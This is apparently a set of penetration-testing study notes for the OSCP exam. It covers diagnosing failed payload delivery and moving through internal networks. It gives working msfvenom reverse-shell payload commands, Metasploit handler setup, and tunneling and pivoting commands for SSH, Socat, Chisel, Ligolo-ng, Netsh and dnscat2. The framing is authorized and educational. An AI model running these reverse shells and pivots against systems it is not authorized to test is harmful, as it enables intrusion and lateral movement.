Commands and use-case variants > **Need:** A recorded delivery/execution chain with the expected consumer and effect. Observable evidence at the relevant boundary and a compatible alternative whose own prerequisites hold | Observation | Most useful next action | | --- | --- | | Transferred hash differs | Repair transfer/encoding before execution | | File arrives then vanishes | Inspect quarantine/detection events and resource path | | File remains; process creation denied | Inspect AppLocker/WDAC, permissions and parent process | | Script-loading policy error | Inspect scope/precedence; use an authorized process-only invocation if applicable | | Explicit AMSI/content block | Treat content/control as confirmed; encoding alone is not a supported conclusion | | Process starts then exits | Capture exit/error, dependency and architecture evidence | | Process remains; no connection | Test target egress, LHOST and listener | | TCP handshake then close | Handler/payload mismatch, stage failure, crash or control interruption | Modern protection can inspect files, scripts after decoding, process memory, behavior and network activity. Therefore: - changing a filename does not imply a new payload; - Base64 does not imply concealment from AMSI; - an in-memory technique is not automatically invisible; - an encoder is primarily useful for transport/bad-character constraints, not guaranteed AV bypass; - a clean third-party scanner result does not prove execution on the target and may disclose a private sample. Prefer the least complex route already supported by evidence: a direct command, native interpreter, authenticated management service or simple command shell may meet the objective without a custom binary. Deep shellcode development, process-injection implementation and generalized AV-bypass recipes are outside this speedrun. Windows Defender status, when the current identity can query it: ```powershell Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled ``` Do not label every failure “AV.” Differentiate: - file never arrived or hashes differ; - file arrived and disappeared/quarantined; - process creation was denied; - script content was blocked; - process started and exited/crashed; - callback was blocked after execution; - application-control or language-mode restrictions; - ordinary format, architecture, permission or dependency errors. Prefer an already available native or authenticated route when it satisfies the objective. Encoding is transport representation, not proof of evasion. Custom shellcode development and deep AV-bypass work are outside this unit. For MOTW/Office/Library-file delivery, execution-policy precedence, AMSI/AppLocker/Defender evidence and restricted Metasploit module/session handling, continue with [payload execution obstacles](../reference/04-shells-transfers-credentials/06-payload-execution-obstacles.md). > **Verify:** Tie the observed block to the artifact/process and preserve the exact error/event context privately. > **If it fails:** No event visibility leaves the diagnosis inconclusive. Deep control-bypass development is not added through troubleshooting.

Commands and use-case variants > **Need:** A recorded delivery/execution chain with the expected consumer and effect. Exact payload/architecture/transport pairing, correct listener binding, reachable staging path and suitable job/session configuration ```bash msfvenom -l payloads | grep -E 'linux|windows' | grep -E 'x64|x86' msfvenom --list formats msfvenom -p PAYLOAD_NAME --list-options ``` Baseline stageless command shells: ```bash msfvenom -p linux/x64/shell_reverse_tcp \ LHOST=LHOST LPORT=LPORT \ -f elf -o shell.elf msfvenom -p windows/x64/shell_reverse_tcp \ LHOST=LHOST LPORT=LPORT \ -f exe -o shell.exe file shell.elf shell.exe sha256sum shell.elf shell.exe ``` Existing reviewed PoC with documented byte restrictions: ```bash msfvenom -p PAYLOAD_NAME \ LHOST=LHOST LPORT=LPORT \ EXITFUNC=thread \ -f FORMAT -v VARIABLE \ -b 'BAD_CHARACTERS' -s MAX_SPACE ``` Use `EXITFUNC` only when the exploit/consumer requires that termination behavior. Never invent bad characters or size limits. Staging distinction: ```text windows/x64/shell_reverse_tcp single/stageless windows/x64/shell/reverse_tcp staged ``` A staged payload first connects and asks its handler for the larger stage. A raw Netcat listener cannot supply that protocol. Matching handler: ```text msfconsole -q use exploit/multi/handler set PAYLOAD PAYLOAD_NAME set LHOST LHOST set LPORT LPORT set ExitOnSession false show options run -j ``` Manage the resulting job/session deliberately: ```text jobs -l sessions -l sessions -i SESSION_ID background sessions -k SESSION_ID jobs -k JOB_ID ``` `ExitOnSession false` keeps the handler available after a session opens. `run -j` backgrounds the handler. A session ID is local to that framework instance; record the target, identity, payload and listener rather than relying on the number alone. Handler failure cues: | Output | Interpretation | | --- | --- | | Handler never binds | Bad local address, occupied port or privilege issue | | Raw listener receives connection; framework does not | Different port/interface or payload transport | | Handler receives connection but no session | Exact payload/stager mismatch, stage blocked or crash | | Session opens then dies | Parent exits, payload exit behavior, route/control or process crash | | Session opens as unexpected architecture/type | Default payload or target was not explicitly selected | > **Verify:** Verify the resulting session's host/identity and keep the listener/payload relationship explicit. > **If it fails:** Wrong payload family, second-stage filtering, listener bind or handler lifecycle can explain the same superficial no-session symptom.

[Use a framework module with explicit target and feature constraints](../notes/methods/execution.md#execution-framework).

Check the listener bind and each route/pivot leg; if delivery works but no callback arrives, repair the return path before changing payload bytes. A recorded first execution proof, correct advertised route, active compatible listener and observable connection evidence 1. **Delivery:** prove the request/file/argument reaches the intended consumer. 2. **Execution:** prove `id`/`whoami`, hostname or a bounded side effect in the exact context. 3. **Parser:** verify quoting, encoding, interpreter, working directory and length. 4. **Payload:** confirm OS, architecture, format, staged/stageless type and dependencies. 5. **Listener:** start it first and verify the bound address and port. 6. **Route:** test target-to-listener reachability from the execution context. 7. **Security control:** use concrete errors, quarantine, logs or process behavior. 8. **Session:** repair TTY, buffering, encoding and job control after connection. Reproduce a harmless direct command in the exact vulnerable or user context. 2. Confirm file/request integrity, final path and consumer. 3. Identify every parser, interpreter and loader. 4. Match target OS, process architecture, artifact format and runtime dependencies. 5. Verify permissions, working directory, execution policy and application-control evidence. 6. Start the correct listener/handler and prove its bind. 7. Prove the target-to-listener route separately. 8. Inspect concrete antimalware, application-control and process-failure evidence. 9. Repair session I/O only after a connection exists. If step 1 fails, this is not yet a payload problem. Return to the exploit, input parser or execution primitive. ##### A. Document delivered, no callback ```text Observed: document exists Unknown: opened, macro permitted, child command, network route Test: MOTW/policy → harmless marker → child process/download → callback route Action: repair first failed gate; do not regenerate the payload first ``` ##### B. Executable disappears after transfer ```text Observed: transfer response succeeded Test: destination listing/hash → Defender detection/resource/event Interpretation: transfer success is not retention; quarantine requires evidence Action: choose a justified alternate execution form or native route, within scope ``` ##### C. PowerShell says scripts are disabled ```text Observed: explicit execution-policy error Test: Get-ExecutionPolicy -List and GPO precedence Action: use a process-scoped invocation if allowed; do not call this an AMSI result ``` ##### D. Connection reaches Netcat but there is no shell ```text Observed: TCP connection Test: generated payload name Interpretation: staged payload may have reached a raw listener Action: use exact multi/handler or generate a compatible stageless command shell ``` ##### E. Binary exists but returns “not found” on Linux ```text Observed: path and file exist Test: file, readelf interpreter, ldd, shebang Interpretation: loader/interpreter dependency may be missing Action: build/choose a compatible artifact; do not change callback settings ``` ##### F. Metasploit module reports completion, no session ```text Observed: module ran Test: exact target profile, payload, callback route, handler output and service state Interpretation: completion is not verified execution/session Action: preserve module output and diagnose the first missing state ``` ```text artifact/request → delivered to intended consumer → required user/trigger action → parser/interpreter/loader → process or bounded side effect → network connection → handler protocol → usable session ``` | Boundary | Decisive evidence | Does not prove | | --- | --- | --- | | Delivery | Expected bytes, request, document or shortcut arrives intact | It was opened or parsed | | Trigger | Intended user/service/parser consumed it | Child process started | | Execution | Harmless marker, process or command output | Callback route works | | Connection | Expected peer reaches listener | Payload and handler agree | | Session | Commands return; host and identity verified | Stability or privilege | Do not replace the artifact, payload, listener and route simultaneously. Record the last confirmed boundary and test the next one. > **Verify:** Use command proof, packet evidence and actual channel behavior to identify the first failed boundary. > **If it fails:** A timeout alone is inconclusive. Return to the original trigger if execution is unproved; use handler/TTY repair only after the prior state is confirmed.

# Pivoting and Tunneling Cheatsheet [← Cheatsheet index](README.md) | [Full procedure](../reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding.md) | [Master Notes](../notes/Master_Notes.md#tunnels-and-network-reachability) | [Strategy map](../notes/Attack_Strategy_Map.md) | Study methods: [Reach internal services](../notes/methods/pivoting.md) ## Route ledger ```text TOOL -> ENTRY LISTENER/SOCKS/TUN -> TRANSPORT -> PIVOT -> DESTINATION TCP/UDP | initiator | bind | DNS point | credential/SPN | callback | cleanup ``` Verify in order: process → listener/session → pivot destination reachability → local route/proxy → simple TCP client → application → separate callback. ## Pivot network state ```bash ip -brief address ip route ip neigh ss -lntup cat /etc/resolv.conf nc -nvz -w 3 INTERNAL_HOST INTERNAL_PORT ``` ```cmd ipconfig /all route print arp -a netstat -ano ``` ```powershell Test-NetConnection INTERNAL_HOST -Port INTERNAL_PORT ``` ## Method chooser | Need | Choose | | --- | --- | | One known TCP socket; inbound SSH to pivot works | SSH `-L` | | Many TCP sockets; inbound SSH to pivot works | SSH `-D` + SOCKS client | | Pivot can only connect outward to Kali | SSH `-R`, remote dynamic `-R PORT`, Chisel reverse or Ligolo agent | | Direct SSH to an internal SSH host | `ssh -J` | | One simple Linux relay | Socat | | Transparent selected subnets over SSH | sshuttle | | Windows built-in route | `ssh.exe`; elevated fixed TCP relay: Netsh | | Windows alternate SSH client | Plink | | HTTP/WebSocket-shaped egress | Chisel | | Many normal clients without proxy wrappers | Ligolo-ng | | DNS-only egress | dnscat2 after proving DNS prerequisites | ## Socat fixed TCP relay ```bash socat -ddd TCP-LISTEN:LOCAL_PORT,bind=PIVOT_REACHABLE_IP,reuseaddr,fork \ TCP:INTERNAL_HOST:INTERNAL_PORT ``` > No authentication or encryption. Listener success does not prove the destination connection. ## OpenSSH Local fixed forward, run on Kali: ```bash ssh -N -L 127.0.0.1:LOCAL_PORT:INTERNAL_HOST:INTERNAL_PORT \ -p SSH_PORT USER@PIVOT -o ExitOnForwardFailure=yes \ -o ServerAliveInterval=30 -o ServerAliveCountMax=3 ``` Local SOCKS, run on Kali: ```bash ssh -N -D 127.0.0.1:1080 -p SSH_PORT USER@PIVOT \ -o ExitOnForwardFailure=yes ``` Remote fixed forward, run on pivot: ```bash ssh -N -R 127.0.0.1:KALI_PORT:INTERNAL_HOST:INTERNAL_PORT \ -p KALI_SSH_PORT KALI_USER@LHOST -o ExitOnForwardFailure=yes ``` Remote dynamic SOCKS, run on pivot; OpenSSH client 7.6+: ```bash ssh -N -R 127.0.0.1:1080 -p KALI_SSH_PORT KALI_USER@LHOST \ -o ExitOnForwardFailure=yes ``` SSH jump and native SOCKS route: ```bash ssh -J PIVOT_USER@PIVOT TARGET_USER@INTERNAL_HOST ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' \ TARGET_USER@INTERNAL_HOST ``` > `-L`/`-D` listen on the SSH client; `-R` listens on the SSH server. The destination connection occurs from the opposite end. Non-loopback remote binds depend on `GatewayPorts`. ## ProxyChains Task-specific `proxychains-pivot.conf`: ```text strict_chain proxy_dns tcp_read_time_out 15000 tcp_connect_time_out 8000 [ProxyList] socks5 127.0.0.1 1080 ``` ```bash proxychains4 -q -f ./proxychains-pivot.conf curl http://INTERNAL_HOST:PORT/ proxychains4 -q -f ./proxychains-pivot.conf nmap -sT -Pn -n -p PORTS INTERNAL_HOST proxychains4 -q -f ./proxychains-pivot.conf impacket-smbclient \ 'DOMAIN/USER:PASSWORD@INTERNAL_HOST' curl --socks5-hostname 127.0.0.1:1080 http://INTERNAL_HOST:PORT/ ncat --proxy-type socks5 --proxy 127.0.0.1:1080 INTERNAL_HOST INTERNAL_PORT ``` > ProxyChains is TCP-only and depends on compatible dynamically linked socket calls. No SYN, ICMP, UDP or pcap discovery. Prefer native proxy options; use focused `nmap -sT -Pn -n` only. ## sshuttle ```bash sudo sshuttle --dns -r SSH_USER@PIVOT:SSH_PORT INTERNAL_SUBNET ANOTHER_SUBNET sudo sshuttle --dns -r SSH_USER@127.0.0.1:LOCAL_SSH_PORT INTERNAL_SUBNET ``` > Requires client-side privileges/firewall support and a compatible Python path on the SSH server. Avoid route collisions with VPN networks. ## Windows Built-in OpenSSH remote dynamic: ```cmd ssh.exe -N -R 127.0.0.1:1080 KALI_USER@LHOST -p KALI_SSH_PORT -o ExitOnForwardFailure=yes ``` Plink remote fixed forward: ```cmd plink.exe -ssh -N -batch -hostkey "HOST_KEY_FINGERPRINT" ^ -l KALI_USER -pwfile C:\PATH\kali-password.txt ^ -R 127.0.0.1:KALI_PORT:INTERNAL_HOST:INTERNAL_PORT ^ -P KALI_SSH_PORT LHOST ``` Netsh fixed TCP relay and cleanup, elevated: ```cmd netsh interface portproxy add v4tov4 listenaddress=PIVOT_REACHABLE_IP listenport=LOCAL_PORT connectaddress=INTERNAL_HOST connectport=INTERNAL_PORT netsh interface portproxy show all netsh advfirewall firewall add rule name="OSCP Pivot LOCAL_PORT" dir=in action=allow protocol=TCP localport=LOCAL_PORT netsh interface portproxy delete v4tov4 listenaddress=PIVOT_REACHABLE_IP listenport=LOCAL_PORT netsh advfirewall firewall delete rule name="OSCP Pivot LOCAL_PORT" ``` > Netsh is TCP-only, elevated and persistent. Verify firewall and IP Helper behavior; remove both objects. ## Chisel Reverse SOCKS: ```bash # Kali chisel server --reverse --port CHISEL_PORT # Pivot chisel client --fingerprint 'SERVER_FINGERPRINT' \ LHOST:CHISEL_PORT R:127.0.0.1:1080:socks ``` Reverse fixed TCP forward: ```bash chisel client --fingerprint 'SERVER_FINGERPRINT' LHOST:CHISEL_PORT \ R:127.0.0.1:LOCAL_PORT:INTERNAL_HOST:INTERNAL_PORT ``` Forward SOCKS: ```bash # Pivot chisel server --socks5 --port CHISEL_PORT # Kali chisel client --fingerprint 'SERVER_FINGERPRINT' PIVOT:CHISEL_PORT \ 127.0.0.1:1080:socks ``` Current UDP-aware listener: ```bash chisel client --fingerprint 'SERVER_FINGERPRINT' \ LHOST:CHISEL_PORT R:127.0.0.1:1080:udpsocks ``` > `socks` is TCP CONNECT only. `udpsocks` additionally supports SOCKS5 UDP ASSOCIATE with current peers, but ProxyChains still cannot carry UDP. Check OS/architecture/runtime compatibility and WebSocket upgrade behavior. ## Ligolo-ng ```bash # Kali ./proxy -selfcert -laddr 0.0.0.0:LIGOLO_PORT # Pivot, after reading certificate_fingerprint in the console ./agent -connect LHOST:LIGOLO_PORT -accept-fingerprint CERT_FINGERPRINT ``` Ligolo console: ```text interface_create --name ligolo session ifconfig interface_add_route --name ligolo --route INTERNAL_SUBNET tunnel_start --tun ligolo ``` Manual route fallback: ```bash sudo ip tuntap add user "$USER" mode tun ligolo sudo ip link set ligolo up sudo ip route add INTERNAL_SUBNET dev ligolo ``` Pivot loopback service: ```bash sudo ip route add 240.0.0.1/32 dev ligolo nmap -sT -Pn -n -p PORTS 240.0.0.1 ``` Callback listener in selected session: ```text listener_add --addr 0.0.0.0:PIVOT_PORT --to 127.0.0.1:KALI_PORT --tcp listener_list listener_stop LISTENER_ID ``` ## DNS tunneling, conditional ```bash # Authoritative domain server dnscat2-server --secret=SHARED_SECRET TUNNEL_DOMAIN # Client ./dnscat --secret=SHARED_SECRET TUNNEL_DOMAIN # Direct server mode ./dnscat --dns server=DNS_SERVER,port=53 --secret=SHARED_SECRET ``` ```text windows window -i SESSION_ID help ``` > Needs client execution plus authoritative NS delegation or direct DNS-server reachability. Slow and conspicuous. A query reaching the server is not yet an authenticated channel. DNS tunneling is distinct from prohibited DNS spoofing. ## Callback route > **Run/context:** distinguish the testing workstation, pivot and internal target for each connection leg. A working tool-to-target tunnel does not establish the target-to-listener return path. **Decide:** trace the listener address/port and each forwarded leg using the [complete callback-routing checks](../reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding.md#12-callback-and-delivery-routing); verify the new session with the [session checks](shells-payloads.md#verify-session). ```text Kali -> tunnel -> internal service access path internal target -> pivot listener -> Kali callback path ``` If a callback is required, separately verify the pivot listener, relay, Kali bind address and target-to-pivot reachability. Do not change payloads until this route is proven. ## Failure cues | Cue | Check next | | --- | --- | | Pivot cannot reach destination | Internal route/firewall/service | | Client cannot reach tunnel server | Listener, pivot egress, transport port | | Listener not created | Bind collision, privilege, server forwarding policy | | Listener works; application fails | Client proxy support, protocol, DNS/SPN, authentication | | ProxyChains does nothing | Static/incompatible process; use native proxy/explicit forward/Ligolo | | Nmap empty through SOCKS | Focused `-sT -Pn -n`, latency, simple Ncat/curl proof | | Kerberos fails through working IP route | FQDN/SPN, DNS, KDC and time | | Chisel server sees no session | Binary execution, egress, WebSocket path | | Ligolo session exists but no traffic | Selected session, interface and OS route | | Forward works; callback fails | Reverse route and listener bind | | Deep route dies globally | Repair first failed upstream hop | ## Cleanup and restriction Remove temporary TUN routes/interfaces, Ligolo listeners, Chisel/Socat/SSH processes, host mappings, Netsh/firewall rules and password files. Record the exact route before cleanup. The current OSCP+ exam guide explicitly prohibits Metasploit pivoting. ## Discover and recognize candidates Use these discovery checks to find a candidate, then validate the missing conditions. Cues are illustrative; complete synthetic outputs and three-outcome examples are in the linked study entries. ### Reach internal services
Find: Discover pivot interfaces, routes and internal service context On the foothold inspect interfaces/routes and local listeners, then test an explicitly assigned destination from that host. ```bash ip addr ip route ss -lntup ``` > **Recognize:** A second network or loopback listener supplies a new vantage candidate; forwarding is not automatically enabled. > **Validate next:** Read interfaces/routes/listeners on the pivot and probe the internal destination from that host. Draw both legs and the initiator; only choose SSH/SOCKS/Ligolo after the destination leg works. [Discover pivot interfaces, routes and internal service context](../notes/methods/pivoting.md#pivot-state).
Commands and use-case variants > **Need:** A pivot identity/process or reachable SSH service and a drawn source-to-destination path. A usable pivot process/identity and explicit scope; both forward and return directions must be understood ```text APPLICATION TOOL -> local listener / SOCKS endpoint / TUN route -> tunnel transport endpoint -> pivot exit -> internal destination service CALLBACK TARGET -> pivot listener or routable address -> relay/tunnel -> final listener ``` Record: ```text TOOL_HOST -> ENTRY_SOCKET/ROUTE -> TRANSPORT -> PIVOT -> DESTINATION application protocol | TCP/UDP | initiator | bind address | DNS point credential/SPN name | callback route | privilege | cleanup objects ``` Do not use “pivot works” as a single state. Confirm these layers separately: 1. the tunnel process started; 2. its listener/transport connection exists; 3. the pivot can reach the intended destination socket; 4. the local route, forward or proxy points at the right exit; 5. the application actually uses that path; 6. name resolution and authentication match the application; 7. a callback, if required, has its own return path. Linux: ```bash id ip -brief address ip route ip neigh ss -lntup cat /etc/resolv.conf ``` Windows: ```cmd whoami /all ipconfig /all route print arp -a netstat -ano ``` PowerShell selected endpoints: ```powershell Get-NetIPConfiguration Get-NetRoute -AddressFamily IPv4 | Sort-Object DestinationPrefix,RouteMetric Get-NetTCPConnection -State Listen Get-DnsClientServerAddress -AddressFamily IPv4 ``` > An interface or route proves a possible network position, not destination reachability. Validate one justified socket from the pivot before building a tunnel. ```bash nc -nvz -w 3 INTERNAL_HOST INTERNAL_PORT curl -v --connect-timeout 5 http://INTERNAL_HOST:INTERNAL_PORT/ ``` ```powershell Test-NetConnection INTERNAL_HOST -Port INTERNAL_PORT ``` | Need | Baseline | Choose when | Main limitation | | --- | --- | --- | --- | | One TCP service through an SSH pivot | SSH local forward | Kali can initiate SSH to pivot | One destination socket per forward | | Many TCP destinations through SSH pivot | SSH dynamic forward | Kali can initiate SSH to pivot | SOCKS/client compatibility | | Pivot can connect outward but inbound access is blocked | SSH remote or remote-dynamic forward | Pivot has OpenSSH client and can reach Kali SSH | Kali SSH policy; OpenSSH version for remote dynamic | | SSH hop directly to internal SSH | `ProxyJump` | Both pivot and destination provide SSH | SSH-only path | | Simple Linux TCP relay | Socat | Binary already exists and listener can be exposed | Clear TCP relay; no authentication/encryption | | Transparent selected subnets through SSH | sshuttle | Suitable SSH server with Python; local privileges | TCP/DNS-oriented, local firewall changes | | Windows SSH-based forward | Built-in `ssh.exe` or Plink | Compatible client exists and outbound SSH works | Server policy and credential/host-key handling | | Windows native fixed TCP relay | `netsh interface portproxy` | Elevated token; target modification acceptable | TCP only; firewall/IP Helper/stateful cleanup | | Outbound HTTP/WebSocket-shaped tunnel | Chisel | Pivot can run matching binary and reach server | Client/server compatibility and proxy/client transport limits | | Routed access for ordinary clients | Ligolo-ng | Agent can reach proxy and TUN/route setup is possible | Userland stack is not identical to direct raw networking | | DNS is the only viable egress | dnscat2 | DNS path plus authoritative/direct server control | Slow/noisy, infrastructure and client required | Prefer one explicit forward for one known service. Use SOCKS when several TCP endpoints must be explored. Use a routed pivot when many ordinary tools must operate without proxy wrappers. Do not add a multi-host route when command execution directly on the pivot is sufficient. Kali/Linux: ```bash ss -lntup ip -brief address ip route ps -ef | grep -E '[s]sh .*-[LDR]|[c]hisel|[l]igolo|[s]ocat|[s]shuttle' ``` Windows: ```cmd netstat -ano tasklist netsh interface portproxy show all netsh advfirewall firewall show rule name="OSCP Pivot LOCAL_PORT" ``` Record: - exact process/command and version; - bind address and port; - transport direction and initiator; - pivot and destination; - routes/name mappings/configuration files added; - simple TCP proof and final application proof; - callback proof where applicable; - cleanup command and result. Stop tunnel processes and remove TUN routes, Ligolo listeners, temporary mappings, password files, Netsh rules and firewall exceptions after the authorized task. > **Verify:** Record source, pivot, destination, protocol, listener placement and required return path. > **If it fails:** Interface presence is not proof of destination reachability. Routing/firewall and application permission are independent.
Find: Relay a single TCP service through a fixed forward From pivot-state evidence identify one fixed TCP destination and where the assessment client can reach a pivot listener. ```bash ip route get TARGET ss -lnt ``` > **Recognize:** A single TCP service can fit a fixed relay without assuming a full routed network. > **Validate next:** Confirm both legs, bind address/permission and any additional dynamic ports or return path. [Relay a single TCP service through a fixed forward](../notes/methods/pivoting.md#fixed-forward).
Commands and use-case variants > **Need:** A pivot identity/process or reachable SSH service and a drawn source-to-destination path. A bindable pivot listener, source-to-listener access and pivot-to-destination connectivity On a Linux pivot, expose one internal TCP service: ```bash socat -ddd TCP-LISTEN:LOCAL_PORT,bind=PIVOT_REACHABLE_IP,reuseaddr,fork \ TCP:INTERNAL_HOST:INTERNAL_PORT ``` Loopback-only relay for another local tunnel stage: ```bash socat -ddd TCP-LISTEN:LOCAL_PORT,bind=127.0.0.1,reuseaddr,fork \ TCP:INTERNAL_HOST:INTERNAL_PORT ``` Verify the listener on the pivot with `ss -lntp | grep LOCAL_PORT`. Run `nc -nvz PIVOT_REACHABLE_IP LOCAL_PORT` from the intended client to test client-to-pivot reachability. These checks run on different machines: ```bash ss -lntp | grep LOCAL_PORT nc -nvz PIVOT_REACHABLE_IP LOCAL_PORT ``` > `fork` handles multiple connections. `reuseaddr` eases rebinding after restart. Socat does not add authentication or encryption to this relay; bind narrowly and remove the process when finished. A listener can exist even when the pivot-to-destination connection fails. > **Verify:** Verify application behavior through the listener and keep the transport's destination explicit. > **If it fails:** A working listener with no application response can be a pivot-to-destination failure. Dynamic RPC may need a different route.
Find: Forward a selected service through an SSH client-side listener Use accepted SSH and the SSH server's verified reachability to a selected internal/loopback service; identify where the local client needs its listener. ```bash ssh -v -p SSH_PORT USER@PIVOT ss -lnt ``` > **Recognize:** Client-side listener plus server-side destination is the -L direction; destination loopback belongs to the SSH server. > **Validate next:** Verify forwarding policy, local bind and server-to-destination application access. [Forward a selected service through an SSH client-side listener](../notes/methods/pivoting.md#ssh-local).
Commands and use-case variants > **Need:** A pivot identity/process or reachable SSH service and a drawn source-to-destination path. Accepted SSH identity and forwarding policy; local listener availability and SSH-server-to-destination route Run on Kali when Kali can SSH to the pivot: ```bash ssh -N \ -L 127.0.0.1:LOCAL_PORT:INTERNAL_HOST:INTERNAL_PORT \ -p SSH_PORT USER@PIVOT \ -o ExitOnForwardFailure=yes \ -o ServerAliveInterval=30 -o ServerAliveCountMax=3 ``` Use the listener as though it were the internal service: ```bash nc -nvz 127.0.0.1 LOCAL_PORT curl -v http://127.0.0.1:LOCAL_PORT/ ``` > The SSH server/pivot resolves and connects to `INTERNAL_HOST`. Bind to `127.0.0.1` unless another authorized local host must use the forward; `-g` or a non-loopback bind expands exposure. Add reliability and attributable failure to transport-only sessions: ```text -N -o ExitOnForwardFailure=yes -o ServerAliveInterval=30 -o ServerAliveCountMax=3 ``` `ExitOnForwardFailure` proves requested listening sockets were established. It does not prove the final destination is reachable through them. > **Verify:** Verify listening address plus the destination application's handshake and preserve correct hostname/SPN semantics when needed. > **If it fails:** Administrative-prohibited indicates SSH forwarding policy; address-in-use is a local bind problem; timeout can be the remote leg.
Find: Provide SOCKS access through SSH dynamic forwarding From accepted SSH and a mapped internal service set determine whether each required client can use a SOCKS TCP connection. ```bash ssh -v -p SSH_PORT USER@PIVOT ``` > **Recognize:** Multiple client-selected TCP destinations suggest a dynamic SOCKS listener rather than many fixed forwards. > **Validate next:** Check SSH forwarding, listener bind, native/intercepted client support and DNS resolution location. [Provide SOCKS access through SSH dynamic forwarding](../notes/methods/pivoting.md#ssh-dynamic).
Commands and use-case variants > **Need:** A pivot identity/process or reachable SSH service and a drawn source-to-destination path. SSH forwarding allowed and clients that support SOCKS or compatible interception; DNS behavior must be chosen explicitly ```bash ssh -N -D 127.0.0.1:1080 -p SSH_PORT USER@PIVOT \ -o ExitOnForwardFailure=yes \ -o ServerAliveInterval=30 -o ServerAliveCountMax=3 ``` OpenSSH acts as a SOCKS4/5 server. The pivot makes destination connections selected by each SOCKS request. > **Verify:** Verify one application through the proxy, then check each client's actual proxy and DNS behavior. > **If it fails:** A working proxy does not make raw SYN/UDP scans viable. Use connect-based clients or a suitable routed tunnel.
Find: Expose an SSH-client-side destination through a server-side remote listener Identify an outbound-only pivot-to-SSH-server path and a service reached from that SSH client/pivot; decide where the remote listener is needed. ```bash ssh -v USER@SSH_SERVER ``` > **Recognize:** The useful listener is on the SSH server while the destination is reached from the client side: a remote forward candidate. > **Validate next:** Verify remote-forward permission, server bind/GatewayPorts policy and pivot-side destination reachability. [Expose an SSH-client-side destination through a server-side remote listener](../notes/methods/pivoting.md#ssh-remote).
Commands and use-case variants > **Need:** A pivot identity/process or reachable SSH service and a drawn source-to-destination path. Outbound SSH route, accepted identity, server forwarding/GatewayPorts policy and reachability to the chosen client-side destination Run on a pivot that can initiate an SSH connection back to Kali: ```bash ssh -N \ -R 127.0.0.1:KALI_PORT:INTERNAL_HOST:INTERNAL_PORT \ -p KALI_SSH_PORT KALI_USER@LHOST \ -o ExitOnForwardFailure=yes \ -o ServerAliveInterval=30 -o ServerAliveCountMax=3 ``` Kali then uses: ```bash nc -nvz 127.0.0.1 KALI_PORT ``` > The SSH client/pivot connects to `INTERNAL_HOST`. `AllowTcpForwarding` and server policy must permit the forward. A non-loopback remote bind additionally depends on `GatewayPorts`; do not assume `0.0.0.0` was honored. > **Verify:** Verify listener placement/bind and actual destination application response. > **If it fails:** A loopback-only server listener is not reachable by another host. Check remote-forward permission and binding before changing service credentials.
Find: Expose a server-side SOCKS proxy through remote dynamic SSH forwarding For an outbound-only SSH path identify the need for several client-selected destinations and inspect the actual SSH client implementation/version. ```bash ssh -V ``` > **Recognize:** Remote listener placement plus per-connection SOCKS destination selection suggests remote dynamic forwarding. > **Validate next:** Check implementation support, remote-forward policy, listener binding and proxy-client/DNS compatibility. [Expose a server-side SOCKS proxy through remote dynamic SSH forwarding](../notes/methods/pivoting.md#ssh-remote-dynamic).
Commands and use-case variants > **Need:** A pivot identity/process or reachable SSH service and a drawn source-to-destination path. A supporting OpenSSH client, allowed remote forwarding, listener binding and SOCKS-compatible tool clients Run on the pivot: ```bash ssh -N -R 127.0.0.1:1080 -p KALI_SSH_PORT KALI_USER@LHOST \ -o ExitOnForwardFailure=yes \ -o ServerAliveInterval=30 -o ServerAliveCountMax=3 ``` The SOCKS listener appears on Kali and destination connections exit through the pivot. Remote dynamic forwarding requires OpenSSH 7.6 or later on the client that issues `-R`. Run `ssh -V` on the pivot (the SSH client). Run `ss -lntp | grep 1080` on Kali (the SSH server hosting the SOCKS listener). These checks run on different machines; do not paste both into one terminal: ```bash ssh -V ss -lntp | grep 1080 ``` > **Verify:** Verify the listener's actual location and source-side exit by application evidence. > **If it fails:** Unsupported client syntax or forwarding policy is different from destination filtering. Use a fixed remote forward if it satisfies the task.
Find: Use ProxyChains, native SOCKS clients and SSH jump paths appropriately Inspect the established proxy/jump topology and each intended client's actual SOCKS or SSH-jump support before a protocol test. ```bash curl --socks5-hostname 127.0.0.1:SOCKS_PORT http://TARGET:PORT/ ``` > **Recognize:** One supported TCP application works; the proxy does not automatically carry raw packets or arbitrary DNS/UDP. > **Validate next:** Check native versus intercepted support, connect-only scanner modes, name resolution and every required protocol leg. [Use ProxyChains, native SOCKS clients and SSH jump paths appropriately](../notes/methods/pivoting.md#proxy-clients).
Commands and use-case variants > **Need:** A pivot identity/process or reachable SSH service and a drawn source-to-destination path. Client/proxy transport compatibility, correct proxy configuration and controlled name resolution Direct SSH through an SSH pivot: ```bash ssh -J PIVOT_USER@PIVOT TARGET_USER@INTERNAL_HOST ``` SSH through an existing SOCKS5 endpoint with Ncat: ```bash ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' \ TARGET_USER@INTERNAL_HOST ``` `%h` and `%p` are replaced with the destination host and port. Prefer this native proxy route when ProxyChains interposition is unreliable.
Use an SSH configuration for repeated access ```sshconfig Host pivot HostName PIVOT User PIVOT_USER Host internal HostName INTERNAL_HOST User TARGET_USER ProxyJump pivot ``` ```bash ssh internal scp FILE internal:DESTINATION_PATH ```
Use a task-specific configuration rather than repeatedly editing a shared global file: ```text strict_chain proxy_dns tcp_read_time_out 15000 tcp_connect_time_out 8000 [ProxyList] socks5 127.0.0.1 1080 ``` ```bash proxychains4 -q -f ./proxychains-pivot.conf curl http://INTERNAL_HOST:PORT/ proxychains4 -q -f ./proxychains-pivot.conf nmap -sT -Pn -n -p PORTS INTERNAL_HOST proxychains4 -q -f ./proxychains-pivot.conf impacket-smbclient \ 'DOMAIN/USER:PASSWORD@INTERNAL_HOST' ``` Constraints: - ProxyChains hooks socket calls in dynamically linked programs; some static binaries, scripts, child processes or dynamically loaded modules bypass or break the hook. - ProxyChains supports TCP only. It does not proxy UDP, ICMP, SYN scans or pcap-based discovery. - For Nmap use `-sT -Pn -n` with a focused port list. Proxy scanning is slow and is not a replacement for discovery from the pivot. - `proxy_dns` moves supported hostname resolution through the proxy, but application behavior varies. `-n` prevents Nmap's local reverse lookups. - Prefer an application's native proxy option when available. Native examples: ```bash curl --socks5-hostname 127.0.0.1:1080 http://INTERNAL_HOST:PORT/ ncat --proxy-type socks5 --proxy 127.0.0.1:1080 INTERNAL_HOST INTERNAL_PORT ``` > 